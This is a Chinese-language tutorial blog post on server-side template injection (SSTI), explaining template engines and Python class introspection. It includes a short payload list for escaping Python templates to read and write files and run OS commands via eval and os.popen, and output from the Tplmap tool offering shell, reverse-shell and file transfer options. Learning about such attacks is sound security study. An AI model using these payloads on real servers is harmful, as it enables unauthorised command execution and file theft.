---
title: SSTI学习(一)
categories: web漏洞
---
## 一：什么是SSTI
SSTI就是`服务器端模板注入`(Server-Side Template Injection)，也给出了一个注入的概念。

SSTI也是注入类的漏洞，其成因其实是可以类比于sql注入的。

SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的`网站模板引擎`(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。

<!--more-->
---
## 二：模板引擎

模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。

模板引擎可以让（网站）程序实现界面与数据分离，`业务代码与逻辑代码的分离`，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易。


**也就是说，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。**

![](https://img-blog.csdnimg.cn/20210303152031737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## 三：一些模块引擎判断


![](https://img-blog.csdnimg.cn/20210303152120691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## 四：关于SSTI 的python类的知识

面向对象语言的方法来自于类，对于python，有很多好用的函数库，我们经常会再写Python中用到import来引入许多的类和方法，python的str(字符串)、dict(字典)、tuple(元组)、list(列表)这些在Python类结构的基类都是object，而object拥有众多的子类。

输入：

```bash
 >>> ''.__class__
 <type 'str'>
 >>> ().__class__
 <type 'tuple'>
 >>> [].__class__
 <type 'list'>
 >>> {}.__class__
 <type 'dict'>
```
`___class__`：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。

```bash
>>> ().__class__.__bases__
(<type 'object'>,)
>>> ''.__class__.__bases__
(<type 'basestring'>,)
>>> [].__class__.__bases__
(<type 'object'>,)
>>> {}.__class__.__bases__
(<type 'object'>,)

>>> [].__class__.__bases__[0]
<type 'object'>
```
`__bases__`：用来查看类的`基类`，也可是使用数组索引来查看特定位置的值

```
>>> [].__class__.__bases__[0].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'sys.getwindowsversion'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'nt.stat_result'>, <type 'nt.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'functools.partial'>, <type 'MultibyteCodec'>, <type 'MultibyteIncrementalEncoder'>, <type 'MultibyteIncrementalDecoder'>, <type 'MultibyteStreamReader'>, <type 'MultibyteStreamWriter'>]
```

`__subclasses__()`：查看当前类的子类。

当然我们也可以直接用`object.__subclasses__()`，会得到和上面一样的结果。

获取基类还能用还有`__mro__`，比如：

```bash
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
>>> [].__class__.__mro__
(<class 'list'>, <class 'object'>)
>>> {}.__class__.__mro__
(<class 'dict'>, <class 'object'>)
>>> ().__class__.__mro__
(<class 'tuple'>, <class 'object'>)

>>> ().__class__.__mro__[1]            //使用索引就能获取基类了
<class 'object'>
```

---
## 五：常用方法

```bash
//获取基本类
''.__class__.__mro__[1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
object

//读文件
().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()
object.__subclasses__()[40](r'C:\1.php').read()

//写文件
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
object.__subclasses__()[40]('/var/www/html/input', 'w').write('123')

//执行任意命令
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )
object.__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )

```

---
## 六：工具使用- Tplmap

```bash
root@kali:/mnt/hgfs/共享文件夹/tplmap-master# python tplmap.py -u "http://192.168.1.10:8000/?name=Sea"                             //判断是否是注入点
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name                //说明可以注入，同时给出了详细信息
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok           //检验出这些利用方法对于目标环境是否可用
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:
                                                                  //可以利用下面这些参数进行进一步的操作
    --os-shell				Run shell on the target
    --os-cmd				Execute shell commands
    --bind-shell PORT			Connect to a shell bind to a target port
    --reverse-shell HOST PORT	Send a shell back to the attacker's port
    --upload LOCAL REMOTE	Upload files to the server
--download REMOTE LOCAL	Download remote files

```

拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利

---
## 七：参考
[SSTI完全学习](https://blog.csdn.net/zz_Caleb/article/details/96480967)

